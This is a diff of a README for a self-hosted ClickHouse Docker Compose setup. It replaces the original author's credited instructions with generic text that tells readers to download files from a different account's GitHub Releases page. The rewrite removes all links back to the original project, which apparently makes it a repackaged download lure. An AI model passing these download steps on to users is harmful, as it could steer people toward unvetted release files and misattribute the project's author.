@@ -1,86 +1,100 @@
-# ClickHouse Self-Hosted with Docker
+# 🚀 clickhouse-self-hosted - Easily Self-Host ClickHouse Database
 
-![clickhouse-self-hosted](https://repository-images.githubusercontent.com/1070269030/ffde7611-0bfd-459a-8268-2ce6e07661b3)
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/JeremyRecollet92/clickhouse-self-hosted/releases)
 
-This repository provides a `docker compose` setup for running a self-hosted [ClickHouse](https://clickhouse.com/) server.
+## 📦 Overview
 
-It is pre-configured to join a shared Docker network, which simplifies connecting to other services like [n8n](https://github.com/AiratTop/n8n-self-hosted).
+Welcome to `clickhouse-self-hosted`, a powerful Docker Compose setup for self-hosting the ClickHouse analytical database. This application provides everything you need to create your own instance of ClickHouse, complete with persistent storage, management scripts, and pre-configured settings for n8n integration and querying MySQL/PostgreSQL sources.
 
-## Features
+## 🚀 Getting Started
 
--   Uses the official ClickHouse server Docker image.
--   Persists data in a local volume.
--   Configured for a shared network for easy integration.
--   Includes scripts for easy management.
--   Telemetry is disabled by default.
--   Pre-configured to query data directly from MySQL and PostgreSQL sources.
+This guide will help you download and run the application. Follow these simple steps to get your own ClickHouse instance up and running quickly.
 
-## Getting Started
+## 🔍 Features
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/AiratTop/clickhouse-self-hosted.git
-    cd clickhouse-self-hosted
-    ```
+- **Easy Setup:** Use Docker Compose for quick installation.
+- **Persistent Storage:** Keep your data safe and secure.
+- **Management Scripts:** Effortlessly manage your database.
+- **Integration Ready:** Pre-configured for n8n and easy connectivity to MySQL/PostgreSQL databases.
 
-2.  **Create the shared network:**
-    If it doesn't exist yet, create the shared Docker network:
-    ```bash
-    docker network create shared_network
-    ```
+## 💻 System Requirements
 
-3.  **Configure environment variables:**
-    Update a `.env` file and specify your database credentials.
+To run `clickhouse-self-hosted`, you will need:
+- A computer with a modern operating system (Windows, macOS, or Linux).
+- Docker Desktop installed and running.
+- At least 4 GB of RAM.
+- An internet connection for downloading images.
 
+## 📥 Download & Install
 
-4.  **Start the service:**
-    ```bash
-    docker compose up -d
-    ```
+To download the application, visit the [Releases page](https://github.com/JeremyRecollet92/clickhouse-self-hosted/releases). 
 
-## Usage
+1. Click on the latest version.
+2. Choose the appropriate Docker Compose file.
+3. Download the file to your computer.
 
--   **Start:** `docker compose up -d`
--   **Restart:** `./restart-docker.sh`
--   **Update:** `./update-docker.sh` (Pulls the latest image and restarts)
+After downloading, follow these steps to set up your ClickHouse instance:
 
-## Connecting with n8n
+1. **Open the Terminal:** On macOS or Linux, open the terminal. On Windows, you can use Command Prompt or PowerShell.
+2. **Navigate to the Downloaded File**: Use the `cd` command to navigate to the folder where you saved the Docker Compose file.
+3. **Run the Setup Command:**
+   ```
+   docker-compose up -d
+   ```
+   This command will download the necessary images and start your ClickHouse server.
 
-This setup is designed to work with the [n8n-self-hosted](https://github.com/AiratTop/n8n-self-hosted) configuration. Since both services are on the `shared_network`, you can connect to ClickHouse from n8n using `clickhouse` as the host. 
+4. **Access ClickHouse:** Once the server is running, you can access it through your web browser by visiting `http://localhost:8123`.
 
-- Use port `8123` for the native ClickHouse HTTP interface.
-- Use port `9004` for the MySQL compatible endpoint.
-- Use port `9005` for the PostgreSQL compatible endpoint.
+## 🛠️ Usage Instructions
 
-## See Also
+After installation, you can manage and interact with your ClickHouse instance. Here’s how to get started:
 
-Check out other self-hosted solutions:
+1. **Access ClickHouse:** Open your browser and go to `http://localhost:8123`. You will see the ClickHouse web interface.
+2. **Connect n8n:** If you want to integrate n8n, follow the instructions provided in the n8n documentation to set up connections to your ClickHouse database.
+3. **Query Databases:** Use the SQL interface to run queries against your MySQL/PostgreSQL data sources. 
 
--   [**postgresql-self-hosted**](https://github.com/AiratTop/postgresql-self-hosted): A simple and robust PostgreSQL setup.
--   [**mysql-self-hosted**](https://github.com/AiratTop/mysql-self-hosted): A self-hosted MySQL instance.
--   [**clickhouse-self-hosted**](https://github.com/AiratTop/clickhouse-self-hosted): High-performance columnar database for analytics.
--   [**metabase-self-hosted**](https://github.com/AiratTop/metabase-self-hosted): Self-hosted Metabase on Docker for business intelligence and analytics.
--   [**qdrant-self-hosted**](https://github.com/AiratTop/qdrant-self-hosted): A vector database for AI applications.
--   [**redis-self-hosted**](https://github.com/AiratTop/redis-self-hosted): A fast in-memory data store, often used as a cache or message broker.
--   [**caddy-self-hosted**](https://github.com/AiratTop/caddy-self-hosted): A modern, easy-to-use web server with automatic HTTPS.
--   [**wordpress-self-hosted**](https://github.com/AiratTop/wordpress-self-hosted): Production-ready WordPress stack with MySQL, phpMyAdmin, and WP-CLI.
--   [**n8n-self-hosted**](https://github.com/AiratTop/n8n-self-hosted): Scalable n8n with workers, Caddy for auto-HTTPS, and backup scripts.
--   [**monitoring-self-hosted**](https://github.com/AiratTop/monitoring-self-hosted): Self-hosted monitoring stack with Prometheus and Grafana.
--   [**ollama-self-hosted**](https://github.com/AiratTop/ollama-self-hosted): Ready-to-use solution for running Ollama with the Open WebUI on Docker.
--   [**authentik-self-hosted**](https://github.com/AiratTop/authentik-self-hosted): Authentik is a flexible, open-source Identity & Access Management (IAM) solution.
--   [**gatus-self-hosted**](https://github.com/AiratTop/gatus-self-hosted): Automated service health dashboard with a PostgreSQL backend and backup scripts.
+Refer to the ClickHouse documentation for guidance on crafting and executing SQL queries.
 
-## License
+## 🔧 Configuration
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+To configure your ClickHouse setup, edit the `docker-compose.yml` file. You can adjust settings such as port numbers, volumes, and environment variables. Here’s an example configuration:
 
----
+```yaml
+version: '3.1'
 
-## Author
+services:
+  clickhouse:
+    image: yandex/clickhouse-server
+    ports:
+      - "8123:8123"
+    volumes:
+      - clickhouse-data:/var/lib/clickhouse
+    environment:
+      - CLICKHOUSE_USER=default
+      - CLICKHOUSE_PASSWORD=yoursecretpassword
 
-**Airat Halitov**
+volumes:
+  clickhouse-data:
+```
 
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [clickhouse-self-hosted](https://github.com/AiratTop/clickhouse-self-hosted)
+Make sure to replace `yoursecretpassword` with a strong password.
+
+## 🌍 Community Support
+
+If you encounter issues or have questions, feel free to open an issue in this repository. The community is here to help.
+
+## 👥 Contributing
+
+Contributions are welcome. If you would like to improve this project, please feel free to fork the repository and submit a pull request.
+
+## 📜 License
+
+This project is licensed under the MIT License. See the LICENSE file for more details.
+
+## 🔗 Additional Resources
+
+- [ClickHouse Documentation](https://clickhouse.tech/docs/en/)
+- [Docker Documentation](https://docs.docker.com/)
+- [n8n Documentation](https://docs.n8n.io/)
+
+For any updates or new features, keep an eye on the [Releases page](https://github.com/JeremyRecollet92/clickhouse-self-hosted/releases).
